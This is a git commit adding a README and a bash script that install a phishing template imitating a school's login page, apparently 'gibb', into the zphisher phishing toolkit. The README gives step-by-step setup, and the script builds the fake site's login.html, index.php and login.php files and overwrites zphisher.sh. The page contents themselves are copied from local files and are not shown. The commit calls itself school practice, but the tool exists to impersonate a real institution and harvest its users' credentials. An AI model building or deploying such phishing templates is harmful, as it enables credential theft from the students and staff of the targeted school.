4f31160a3176c3a30e42ae73fd466bd84882ef03
parwarr <parwar.habasch@gmx.de>
2023-04-07 01:20:36 +0200

    Created gibb survey template for zphisher

---
+++ README.md
@@ -0,0 +1,42 @@
+## Description
+This script was made as a practice purpose for the school.
+
+Make sure you cloned the github repo: https://github.com/htr-tech/zphisher.git before running this script otherwise it will not work!
+
+This script is used for private use only
+
+## Installation
+
+make sure you have git installed on your PC.
+
+clone the repos: 
+
+git clone https://github.com/htr-tech/zphisher.git
+
+after that you can clone this repo with:
+
+git clone https://github.com/parwarr/gibbzphisher.git
+
+go to the directory where you cloned this directory: 
+
+cd ...
+
+run the following command to run the script: 
+
+ sudo chmod +x gibbzphisher.sh
+
+then you can run the script with:
+
+ ./gibbzphisher.sh or bash gibbzphisher.sh
+
+After the script was finished you now have the gibb page as a template in zphisher. :D 
+
+move to the zphisher directory: 
+
+cd /home/USER/zphisher
+
+run the following command to start the script
+
+./zphisher.sh or bash zpisher.sh
+
+there you go :D 
---
+++ gibbzphisher.sh
@@ -0,0 +1,79 @@
+#!/bin/bash
+gibbFolder="/home/$USER/zphisher/.sites/gibb"
+cssFolder="/home/$USER/zphisher/.sites/gibb/css"
+cssFile="/home/$USER/zphisher/.sites/gibb/css/app.css"
+loginHtml="/home/$USER/zphisher/.sites/gibb/login.html"
+indexPhp="/home/$USER/zphisher/.sites/gibb/index.php"
+loginPhp="/home/$USER/zphisher/.sites/gibb/login.php"
+zphisherOrg="/home/$USER/zphisher/zphisher.sh"
+
+CreateFolderAndFiles(){
+mkdir $gibbFolder
+mkdir $cssFolder
+touch $cssFile
+touch $loginHtml 
+touch $indexPhp 
+touch $loginPhp
+
+}
+
+if [[ -d $gibbFolder ]]; then
+
+rm -rf $gibbFolder
+echo "Gibb Folder already exist, deleted the folder, please re-run the script :) "
+exit 1
+
+else 
+
+CreateFolderAndFiles
+
+fi
+
+# Insert HTML info
+
+htmlTxt="/home/$USER/Documents/dev/html.txt"
+
+cp $htmlTxt $loginHtml
+
+# Insert css info
+cssTxt="/home/$USER/Documents/dev/css.txt"
+
+cp $cssTxt $cssFile
+
+# Insert index.php info
+
+indexTxt="/home/$USER/Documents/dev/index.txt"
+
+cp $indexTxt $indexPhp
+
+# Insert login.php info
+
+loginTxt="/home/$USER/Documents/dev/login.txt"
+
+cp $loginTxt $loginPhp
+
+
+# Insert zphisher.sh info
+
+bashFile="/home/$USER/Documents/dev/bash.txt"
+
+cp $bashFile $zphisherOrg
+
+
+if grep -q "Gibb" $zphisherOrg; then
+
+echo "Thanks for using my script. Created by:"
+
+echo "    ____                                ";
+echo "   / __ \____ _______      ______ ______";
+echo "  / /_/ / __ \`/ ___/ | /| / / __ \`/ ___/";
+echo " / ____/ /_/ / /   | |/ |/ / /_/ / /    ";
+echo "/_/    \__,_/_/    |__/|__/\__,_/_/     ";
+echo "                                        ";
+
+exit 0
+else 
+echo "something went wrong, make sure that you have cloned the zphisher repo while running this script."
+exit 1 
+fi
+
